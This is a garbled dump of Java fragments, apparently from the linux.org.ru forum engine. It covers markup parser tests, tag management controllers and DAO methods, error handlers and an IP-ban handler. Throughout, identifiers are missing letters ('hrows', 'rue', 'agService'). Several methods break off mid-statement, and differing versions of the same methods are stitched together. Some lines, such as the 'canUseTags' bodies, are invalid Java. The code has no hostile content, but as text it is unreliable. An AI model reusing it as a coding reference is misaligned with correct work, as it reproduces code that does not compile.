public void urlParamWithTagTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]l[/b]inux[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]linux[/b][/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/LIST]</code></pre></div> " , lorCodeService . parseComment ( " [CODE][list][*]one[*]two[*]three[/LIST][/code] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/CODE] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[LIST][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[LIST][*]one[*]two[*]three[/list][/CODE] " , false ) ) ; 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/CODE] " , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=cxx]#include <stdio.h>[/code] " , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=foo]#include <stdio.h>[/code] " , false ) ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[QUOTE][i]hz[/I][/quote] " , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [URL=http:example.com]example[/url] example " , false ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , rue ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/CUT][cut]test[/cut] " , false ) ) ; 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/URL] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com']example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com]example[/url] " , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/LIST] " , false ) ) ; 
public ModelAndView showDefaultTagListHandlertags ( HttpServletRequest request ) hrows TagNotFoundException { return showTagListHandler ( " " , request ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter , HttpServletRequest request ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; Template mpl = Template . getTemplate ( request ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ! mpl . isModeratorSession ( ) ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByFirstLetter ( firstLetter , ! mpl . isModeratorSession ( ) ) ; if ( ags . size ( ) = = 0 ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " error " ) ; } modelAndView . addObject ( " exception " , ex ) ; return modelAndView ; } 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " error " ) ; prepareModelForCommonException ( modelAndView , request , ex ) ; } modelAndView . addObject ( " exception " , ex ) ; return modelAndView ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " error.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { String infoMessage = sendEmailToAdmin ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public static DateFormat createShort ( ) { return new SimpleDateFormat ( " dd.MM.yy HH:mm " ) ; } 
public ModelAndView defaultExceptionHandler ( HttpServletRequest request , HttpServletResponse response , Object handler ) { Exception ex = ( Exception ) request . getAttribute ( " javax.servlet.error.exception " ) ; if ( ex = = null ) { return new ModelAndView ( new RedirectView ( " / " ) ) ; } return exceptionResolver . resolveException ( request , response , handler , ex ) ; } 
public ModelAndView handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " errors/user-banned " , " exception " , ex ) ; } 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " errors/common " ) ; prepareModelForCommonException ( modelAndView , request , ex ) ; } modelAndView . addObject ( " exception " , ex ) ; return modelAndView ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { String infoMessage = sendEmailToAdmin ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public @ResponseBody List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Map < String , Integer > ags = agService . getTagsByFirstLetter ( erm . substring ( 0 , 1 ) , rue ) ; return ImmutableList . copyOf ( Iterables . filter ( ags . keySet ( ) , new Predicate < String > ( ) { @Override 
public boolean apply ( String input ) { return input . startsWith ( erm ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter , HttpServletRequest request ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; Template mpl = Template . getTemplate ( request ) ; modelAndView . addObject ( " isModeratorSession " , mpl . isModeratorSession ( ) ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ! mpl . isModeratorSession ( ) ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByFirstLetter ( firstLetter , ! mpl . isModeratorSession ( ) ) ; if ( ags . size ( ) = = 0 ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Map < String , Integer > ags = agService . getTagsByFirstLetter ( erm . substring ( 0 , 1 ) , rue ) ; return ImmutableList . copyOf ( Iterables . filter ( ags . keySet ( ) , new Predicate < String > ( ) { @Override 
public ModelAndView changeTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " agName " ) String oldTagName ) { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { return notFoundPage ; } TagRequest . Change agRequestChange = new TagRequest . Change ( ) ; agRequestChange . setOldTagName ( oldTagName ) ; agRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestChange " , agRequestChange ) ; return modelAndView ; } 
public ModelAndView changeTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " agRequestChange " ) TagRequest . Change agRequestChange , Errors errors ) { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { return notFoundPage ; } agService . change ( agRequestChange . getOldTagName ( ) , agRequestChange . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( agRequestChange . getTagName ( ) ) ; } ModelAndView modelAndView = new ModelAndView ( " ags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
private ModelAndView redirectToListPage ( String agName ) { String firstLetter = String . valueOf ( agName . oLowerCase ( ) . charAt ( 0 ) ) ; String redirectUrl ; ry { redirectUrl = " /tags/ " + URLEncoder . encode ( firstLetter , " UTF-8 " ) ; } catch ( UnsupportedEncodingException e ) { redirectUrl = " /tags " ; } ModelAndView modelAndView = new ModelAndView ( new RedirectView ( redirectUrl ) ) ; return modelAndView ; } 
public void createTag ( String agName ) { jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES(?) " , 
public void changeTag ( Integer agId , String agName ) { jdbcTemplate . update ( " UPDATE tags_values set value=? WHERE id=? " , 
public int getTagId ( String ag ) hrows TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( QUERY_TAG_ID_BY_NAME + " AND counter>0 " , Integer . class , ag ) ; if ( res . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; 
public int getTagIdByName ( String agName ) hrows TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( QUERY_TAG_ID_BY_NAME , Integer . class , agName ) ; if ( res . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; 
public int getTagId ( String ag ) hrows UserErrorException , TagNotFoundException { checkTag ( ag ) ; return agDao . getTagId ( ag ) ; } 
private void prepareChangeDataBinder ( ) { TagRequest . Change agRequestChange = new TagRequest . Change ( ) ; binder = new WebDataBinder ( agRequestChange ) ; } 
public void changeTest ( ) hrows Exception { when ( agDao . getTagIdByName ( " estTag " ) ) . henReturn ( 123 ) ; when ( agDao . getTagIdByName ( " estNewTag " ) ) . henReturn ( 456 ) ; when ( agDao . getTagIdByName ( " InvalidTestTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; when ( agDao . getTagIdByName ( " estNewTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void increaseCounterById ( int agId ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " , 
public void decreaseCounterById ( int agId ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " , 
public void addTagToTopic ( int msgId , int agId ) { jdbcTemplate . update ( " INSERT INTO tags VALUES(?,?) " , 
public void deleteTagFromTopic ( int msgId , int agId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE msgid=? and tagid=? " , 
public synchronized boolean updateTags ( final int msgId , final List < String > agList ) { final List < String > oldTags = getMessageTags ( msgId ) ; boolean modified = false ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( ag ) ; agDao . addTagToTopic ( msgId , id ) ; modified = rue ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( ag ) ; agDao . deleteTagFromTopic ( msgId , id ) ; modified = rue ; } } return modified ; } 
public synchronized void updateCounters ( final List < String > oldTags , final List < String > newTags ) { for ( String ag : newTags ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( ag ) ; agDao . increaseCounterById ( id ) ; } } for ( String ag : oldTags ) { if ( ! newTags . contains ( ag ) ) { 
public void create ( String agName ) { agDao . createTag ( agName ) ; } 
public ModelAndView deleteTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " agName " ) String oldTagName ) { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { return notFoundPage ; } TagRequest . Delete agRequestDelete = new TagRequest . Delete ( ) ; agRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestDelete " , agRequestDelete ) ; return modelAndView ; } 
public ModelAndView deleteTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " agRequestDelete " ) TagRequest . Delete agRequestDelete , Errors errors ) { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { return notFoundPage ; } agService . delete ( agRequestDelete . getOldTagName ( ) , agRequestDelete . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( firstLetter ) ; } ModelAndView modelAndView = new ModelAndView ( " ags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
public void deleteTag ( int agId ) { jdbcTemplate . update ( " DELETE FROM tags_values WHERE id=? " , 
public void increaseCounterById ( int agId , int agCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter+? WHERE id=? " , 
public void decreaseCounterById ( int agId , int agCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter-? WHERE id=? " , 
public void replaceTagForTopics ( int oldTagId , int newTagId ) { jdbcTemplate . update ( " UPDATE tags SET tagid=? WHERE tagid=? AND msgid NOT IN (SELECT msgid FROM tags WHERE tagid=?) " , 
public void deleteTagFromTopics ( int agId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE tagid=? " , 
public void updateCounters ( final List < String > oldTags , final List < String > newTags ) { for ( String ag : newTags ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( ag ) ; agDao . increaseCounterById ( id , 1 ) ; } } for ( String ag : oldTags ) { if ( ! newTags . contains ( ag ) ) { 
public void create ( String agName ) { agDao . createTag ( agName ) ; } 
private void prepareDeleteDataBinder ( ) { TagRequest . Delete agRequestDelete = new TagRequest . Delete ( ) ; binder = new WebDataBinder ( agRequestDelete ) ; } 
public void deleteTest ( ) hrows Exception { when ( agDao . getTagIdByName ( " InvalidTestTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Map < String , Integer > ags = agService . getTagsByFirstLetter ( erm . substring ( 0 , 1 ) , false ) ; return ImmutableList . copyOf ( Iterables . filter ( ags . keySet ( ) , new Predicate < String > ( ) { @Override 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " errors/common " ) ; prepareModelForCommonException ( modelAndView , request , ex ) ; } modelAndView . addObject ( " exception " , ex ) ; response . setStatus ( HttpServletResponse . SC_INTERNAL_SERVER_ERROR ) ; return modelAndView ; } 
public ModelAndView changeTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " agName " ) String oldTagName ) hrows AccessViolationException { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Change agRequestChange = new TagRequest . Change ( ) ; agRequestChange . setOldTagName ( oldTagName ) ; agRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestChange " , agRequestChange ) ; return modelAndView ; } 
public ModelAndView changeTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " agRequestChange " ) TagRequest . Change agRequestChange , Errors errors ) hrows AccessViolationException { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } agService . change ( agRequestChange . getOldTagName ( ) , agRequestChange . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( agRequestChange . getTagName ( ) ) ; } ModelAndView modelAndView = new ModelAndView ( " ags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
public ModelAndView deleteTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " agName " ) String oldTagName ) hrows AccessViolationException { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Delete agRequestDelete = new TagRequest . Delete ( ) ; agRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestDelete " , agRequestDelete ) ; return modelAndView ; } 
public ModelAndView deleteTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " agRequestDelete " ) TagRequest . Delete agRequestDelete , Errors errors ) hrows AccessViolationException { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } agService . delete ( agRequestDelete . getOldTagName ( ) , agRequestDelete . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( firstLetter ) ; } ModelAndView modelAndView = new ModelAndView ( " ags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
public void recalcTagsCounters ( ) { agDao . recalcAllCounters ( ) ; } 
public void recalcAllCounters ( ) { jdbcTemplate . update ( " update tags_values set counter = (select count(*) from tags join topics on tags.msgid=topics.id where tags.tagid=tags_values.id and not deleted and moderate) " ) ; } 
public void createTag ( String agName ) { jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES(?) " , agName ) ; } 
public void changeTag ( Integer agId , String agName ) { jdbcTemplate . update ( " UPDATE tags_values set value=? WHERE id=? " , agName , agId ) ; 
public void deleteTag ( int agId ) { jdbcTemplate . update ( " DELETE FROM tags_values WHERE id=? " , agId ) ; } 
public void increaseCounterById ( int agId , int agCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter+? WHERE id=? " , agCount , agId ) ; } 
public void decreaseCounterById ( int agId , int agCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter-? WHERE id=? " , agCount , agId ) ; } 
public void addTagToTopic ( int msgId , int agId ) { jdbcTemplate . update ( " INSERT INTO tags VALUES(?,?) " , msgId , agId ) ; } 
public void deleteTagFromTopic ( int msgId , int agId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE msgid=? and tagid=? " , msgId , agId ) ; 
public void deleteTagFromTopics ( int agId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE tagid=? " , agId ) ; } 
public String apply ( TrackerFilter input ) { return input . getValue ( ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author ; ry { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } int msgid = resultSet . getInt ( " id " ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; int stat1 = resultSet . getInt ( " stat1 " ) ; int groupId = resultSet . getInt ( " gid " ) ; String groupTitle = resultSet . getString ( " gtitle " ) ; String itle = resultSet . getString ( " itle " ) ; int cid = resultSet . getInt ( " cid " ) ; User lastCommentBy ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } boolean resolved = resultSet . getBoolean ( " resolved " ) ; int section = resultSet . getInt ( " section " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; Timestamp postdate = resultSet . getTimestamp ( " postdate " ) ; boolean uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; int pages = Topic . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
private boolean isGoodTag ( String ag ) { return agRE . matcher ( ag ) . matches ( ) & & ag . length ( ) > = MIN_TAG_LENGTH & & ag . length ( ) < = MAX_TAG_LENGTH ; } 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return rue ; } return user ! = null & & user . isAdministrator ( ) ; && user.getScore()>=500; } 
public void recalcAllCounters ( ) { jdbcTemplate . update ( " update tags_values set counter = (select count(*) from tags join topics on tags.msgid=topics.id where tags.tagid=tags_values.id and not deleted) " ) ; } 
public void moveTopic ( Topic msg , Group newGrp , User moveBy ) { String url = msg . getUrl ( ) ; boolean lorcode = msgbaseDao . getMessageText ( msg . getId ( ) ) . isLorcode ( ) ; jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , newGrp . getId ( ) , msg . getId ( ) ) ; if ( ! newGrp . isLinksAllowed ( ) & & ! newGrp . isImagePostAllowed ( ) ) { jdbcTemplate . update ( " UPDATE topics SET linktext=null, url=null WHERE id=? " , msg . getId ( ) ) ; 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return rue ; } return user ! = null & & user . isModerator ( ) ; && user.getScore()>=500; } 
public boolean apply ( String input ) { return input . startsWith ( erm ) & & TagService . isGoodTag ( input ) ; } 
public static boolean isGoodTag ( String ag ) { return agRE . matcher ( ag ) . matches ( ) & & ag . length ( ) > = MIN_TAG_LENGTH & & ag . length ( ) < = MAX_TAG_LENGTH ; } 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return rue ; } return user ! = null & & user . getScore ( ) > = 400 ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) Boolean allow_posting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) Boolean captcha_required ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , s , allow_posting , captcha_required ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , " UTF-8 " ) ) ) ; } 
private static ModelAndView redirectToProfile ( User user ) hrows UnsupportedEncodingException { return new ModelAndView ( new RedirectView ( getNoCacheLinkToProfile ( user ) ) ) ; } 
